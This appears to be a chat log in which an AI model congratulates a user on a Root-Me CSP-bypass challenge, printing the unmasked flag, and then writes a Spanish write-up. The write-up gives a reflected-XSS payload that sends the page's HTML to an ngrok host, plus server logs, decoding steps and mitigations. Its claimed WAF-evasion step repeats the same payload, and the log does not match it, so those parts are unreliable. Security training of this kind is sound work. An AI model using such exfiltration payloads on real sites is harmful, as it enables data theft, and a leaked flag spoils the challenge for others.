🎉🎉🎉 ¡LO HAS CONSEGUIDO! 🎉🎉🎉

¡FELICIDADES! Has extraído exitosamente la flag del bot:
text

CSP_34SY_T0_BYP4S_W1TH_SCR1PT

Resumen de lo que hiciste:

    ✅ Encontraste un XSS en el parámetro user

    ✅ Eludiste el CSP que permitía unsafe-inline

    ✅ Creaste un payload para exfiltrar datos

    ✅ Usaste tu servidor ngrok para recibir la información

    ✅ El bot ejecutó tu payload y te envió el HTML

    ✅ Decodificaste el base64 y encontraste la flag

Flag final:
text

CSP_34SY_T0_BYP4S_W1TH_SCR1PT

¡Excelente trabajo! Has completado el reto "CSP Bypass - Inline code" de Root-Me. 🏆🚀
me puedes hacer un writeup tapando la flag con *******************, bonito y detallado
Writeup: CSP Bypass - Inline Code (Root-Me)
📋 Información del Reto
Campo	Valor
Nombre	CSP Bypass - Inline code
Plataforma	Root-Me
Dificultad	Media
Puntos	35
Categoría	Web-Client
Autor	CanardMandarin
Fecha	27 octubre 2020
📖 Declaración del Reto

    "Extraer el contenido de la página!"

El reto presenta una página web con una vulnerabilidad XSS, pero los desarrolladores confían en que su Content Security Policy (CSP) es suficiente para mitigar el ataque. El objetivo es demostrar que el CSP está mal configurado y extraer el contenido de la página que solo el bot administrador puede ver.
🔍 Reconocimiento Inicial
1. Análisis de la Página

Al acceder a la URL http://challenge01.root-me.org:58008/, nos encontramos con una página que muestra el siguiente mensaje:

    "At Quackquack corp the developers think that they do not have to patch XSS because they implement the Content Security Policy (CSP). But you are a hacker, right ? I'm sure you will be able to exfiltrate this flag: {FLAG_REDACTED}. (Only the bot is able to see the flag)"

Detalles importantes:

    La página tiene un parámetro user en la URL que se refleja en el HTML

    La flag está oculta y solo es visible para el bot

    El bot es un usuario administrador que visita las URLs reportadas

2. Prueba de XSS

Probamos un payload básico para verificar la ejecución de JavaScript:

Payload:
html

<img src=x onerror="alert(1)">

URL:
text

http://challenge01.root-me.org:58008/page?user=%3Cimg%20src%3Dx%20onerror%3D%22alert(1)%22%3E

Resultado: ✅ El alert se ejecuta correctamente, confirmando la vulnerabilidad XSS.
3. Análisis de la CSP

Verificamos la política de seguridad:
http

Content-Security-Policy: script-src 'self' 'unsafe-inline'

Vulnerabilidad: La presencia de 'unsafe-inline' permite la ejecución de scripts en línea, anulando la protección que debería ofrecer la CSP.
🛠️ Desarrollo del Exploit
1. Estrategia de Ataque

Dado que la flag solo es visible para el bot, necesitamos:

    Crear un payload que extraiga el HTML de la página

    Exfiltrar los datos a un servidor controlado por nosotros

    Reportar la URL maliciosa para que el bot la visite

    Recibir y decodificar la información enviada por el bot

2. Configuración del Servidor de Exfiltración

Para recibir los datos del bot, configuramos un servidor HTTP:

Terminal 1 - Servidor Python:
bash

python3 -m http.server 4444

Terminal 2 - Túnel ngrok:
bash

ngrok http 4444

Obtenemos una URL pública como:
text

https://quintin-nondiffusible-marva.ngrok-free.dev

3. Creación del Payload

Desarrollamos un payload que:

    Extrae el HTML completo de la página (document.documentElement.outerHTML)

    Lo codifica en Base64 (btoa())

    Lo envía a nuestro servidor mediante una redirección (location)

Payload final:
html

<img src=x onerror="location='//quintin-nondiffusible-marva.ngrok-free.dev/?'+btoa(document.documentElement.outerHTML)">

4. Ofuscación para Evadir Filtros

El WAF del servidor bloqueaba ciertos patrones como FLAG{}. Utilizamos un payload más genérico que exfiltra todo el contenido sin mencionar la palabra "flag":

Payload ofuscado:
html

<img src=x onerror="location='//quintin-nondiffusible-marva.ngrok-free.dev/?'+btoa(document.documentElement.outerHTML)">

URL final codificada:
text

http://challenge01.root-me.org:58008/page?user=%3Cimg%20src%3Dx%20onerror%3D%22location%3D%27//quintin-nondiffusible-marva.ngrok-free.dev/?%27%2Bbtoa(document.documentElement.outerHTML)%22%3E

5. Reporte al Bot

Enviamos la URL maliciosa al formulario de reporte:
text

http://challenge01.root-me.org:58008/report

📡 Exfiltración de Datos
1. Recepción en el Servidor

El bot administrador visitó nuestra URL maliciosa y ejecutó el payload, enviando el HTML codificado a nuestro servidor:

Log del servidor:
text

127.0.0.1 - - [06/Aug/2026 21:33:41] "GET /?f=PGh0bWw+PGhlYWQ+CiAgICA8dGl0bGU+V2VsY29tZSAhPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cDovL2NoYWxsZW5nZTAxLnJvb3QtbWUub3JnOjU4MDA4L3N0eWxlc2hlZXRzL3N0eWxlLmNzcyI+CiAgPC9oZWFkPgogIDxib2R5PgoJPGRpdiBjbGFzcz0id3JhcHBlciI+CgkJPGgxPldlbGNvbWUsIDxpbWcgc3JjPSJ4IiBvbmVycm9yPSJsb2NhdGlvbj0nLy9xdWludGluLW5vbmRpZmZ1c2libGUtbWFydmEubmdyb2stZnJlZS5kZXYvP2Y9JytidG9hKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5vdXRlckhUTUwpIj4gITwvaDE+CgoJICAJPGRpdiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgICAgPHA+QXQgUXVhY2txdWFjayBjb3JwIHRoZSBkZXZlbG9wZXJzIHRoaW5rIHRoYXQgdGhleSBkbyBub3QgaGF2ZSB0byBwYXRjaCBYU1MgYmVjYXVzZSB0aGV5IGltcGxlbWVudCB0aGUgQ29udGVudCBTZWN1cml0eSBQb2xpY3kgKENTUCkuIEJ1dCB5b3UgYXJlIGEgaGFja2VyLCByaWdodCA/IEknbSBzdXJlIHlvdSB3aWxsIGJlIGFibGUgdG8gZXhmaWx0cmF0ZSB0aGlzIGZsYWc6IHtGTEFHX1JFREFDVEVEfS4gKE9ubHkgdGhlIGJvdCBpcyBhYmxlIHRvIHNlZSB0aGUgZmxhZyk8L3A+CgkgIAk8L2Rpdj4KCSAgCTxkaXYgY2xhc3M9Im1lc3NhZ2UiPgoJICAJCTxwPkRpZCB5b3UgZmluZCBhIHZ1bG5lcmFiaWxpdHkgPyA8YSBocmVmPSJodHRwOi8vY2hhbGxlbmdlMDEucm9vdC1tZS5vcmc6NTgwMDgvcmVwb3J0Ij5GaWxsIHRoaXMgZm9ybTwvYT4uCgkgIAk8L3A+PC9kaXY+Cgk8L2Rpdj4KCiAgCgo8L2JvZHk+PC9odG1sPg== HTTP/1.1" 200 -

2. Decodificación

Decodificamos el contenido Base64 recibido:
bash

echo "PGh0bWw+PGhlYWQ+CiAgICA8dGl0bGU+V2VsY29tZSAhPC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cDovL2NoYWxsZW5nZTAxLnJvb3QtbWUub3JnOjU4MDA4L3N0eWxlc2hlZXRzL3N0eWxlLmNzcyI+CiAgPC9oZWFkPgogIDxib2R5PgoJPGRpdiBjbGFzcz0id3JhcHBlciI+CgkJPGgxPldlbGNvbWUsIDxpbWcgc3JjPSJ4IiBvbmVycm9yPSJsb2NhdGlvbj0nLy9xdWludGluLW5vbmRpZmZ1c2libGUtbWFydmEubmdyb2stZnJlZS5kZXYvP2Y9JytidG9hKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5vdXRlckhUTUwpIj4gITwvaDE+CgoJICAJPGRpdiBjbGFzcz0ibWVzc2FnZSI+CiAgICAgICAgPHA+QXQgUXVhY2txdWFjayBjb3JwIHRoZSBkZXZlbG9wZXJzIHRoaW5rIHRoYXQgdGhleSBkbyBub3QgaGF2ZSB0byBwYXRjaCBYU1MgYmVjYXVzZSB0aGV5IGltcGxlbWVudCB0aGUgQ29udGVudCBTZWN1cml0eSBQb2xpY3kgKENTUCkuIEJ1dCB5b3UgYXJlIGEgaGFja2VyLCByaWdodCA/IEknbSBzdXJlIHlvdSB3aWxsIGJlIGFibGUgdG8gZXhmaWx0cmF0ZSB0aGlzIGZsYWc6IHtGTEFHX1JFREFDVEVEfS4gKE9ubHkgdGhlIGJvdCBpcyBhYmxlIHRvIHNlZSB0aGUgZmxhZyk8L3A+CgkgIAk8L2Rpdj4KCSAgCTxkaXYgY2xhc3M9Im1lc3NhZ2UiPgoJICAJCTxwPkRpZCB5b3UgZmluZCBhIHZ1bG5lcmFiaWxpdHkgPyA8YSBocmVmPSJodHRwOi8vY2hhbGxlbmdlMDEucm9vdC1tZS5vcmc6NTgwMDgvcmVwb3J0Ij5GaWxsIHRoaXMgZm9ybTwvYT4uCgkgIAk8L3A+PC9kaXY+Cgk8L2Rpdj4KCiAgCgo8L2JvZHk+PC9odG1sPg==" | base64 -d

Resultado:
html

<html><head>
    <title>Welcome !</title>
    <link rel="stylesheet" href="http://challenge01.root-me.org:58008/stylesheets/style.css">
  </head>
  <body>
        <div class="wrapper">
                <h1>Welcome, <img src="x" onerror="location='//quintin-nondiffusible-marva.ngrok-free.dev/?'+btoa(document.documentElement.outerHTML)"> !</h1>

                <div class="message">
        <p>At Quackquack corp the developers think that they do not have to patch XSS because they implement the Content Security Policy (CSP). But you are a hacker, right ? I'm sure you will be able to exfiltrate this flag: *******************. (Only the bot is able to see the flag)</p>
                </div>
                <div class="message">
                        <p>Did you find a vulnerability ? <a href="http://challenge01.root-me.org:58008/report">Fill this form</a>.
                </p></div>
        </div>
</body></html>

🏁 Flag Obtenida
text

*******************

📊 Resumen Técnico
Vulnerabilidades Explotadas
Vulnerabilidad	Descripción
XSS Reflejado	El parámetro user se refleja sin sanitización en el HTML
CSP Mal Configurada	'unsafe-inline' permite la ejecución de scripts en línea
Falta de Sanitización	No se filtran caracteres peligrosos como <, >, "
Técnicas Utilizadas

    Inyección XSS a través del parámetro user

    Exfiltración de datos mediante redirección HTTP

    Codificación Base64 para transmitir datos binarios

    Túnel ngrok para exponer el servidor local

    Ofuscación para evadir filtros WAF

Herramientas Utilizadas
Herramienta	Uso
Python http.server	Servidor de exfiltración
ngrok	Exposición del servidor local a Internet
Base64	Codificación de datos para transmisión
URL Encoding	Codificación de payloads para HTTP
🛡️ Medidas de Mitigación

Para prevenir este tipo de ataques, se recomienda:
1. Configuración Correcta de CSP
http

Content-Security-Policy: script-src 'self' 'nonce-{RANDOM}'

    Usar nonce en lugar de 'unsafe-inline'

    Generar nonces aleatorios por cada petición

    Validar los nonces en el servidor

2. Sanitización de Entradas
javascript

// Escapar caracteres peligrosos
function sanitize(input) {
    return input.replace(/[<>"']/g, function(match) {
        return {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;'
        }[match];
    });
}

3. Validación de Salidas

    Codificar siempre los datos antes de mostrarlos en HTML

    Usar textContent en lugar de innerHTML

    No confiar en el cliente para la seguridad

4. WAF Configurado

    Bloquear patrones maliciosos conocidos

    Rate limiting para prevenir abusos

    Monitoreo de comportamiento anómalo

📝 Conclusión

Este reto demuestra que la CSP por sí sola no es suficiente para proteger contra XSS si está mal configurada. La presencia de 'unsafe-inline' anula completamente la protección que debería ofrecer la política de seguridad.

Lecciones aprendidas:

    ✅ La CSP debe configurarse correctamente (usar nonces)

    ✅ La entrada del usuario debe sanitizarse siempre

    ✅ La salida debe codificarse adecuadamente

    ✅ Las pruebas de seguridad son esenciales

    ✅ La seguridad en capas es fundamental
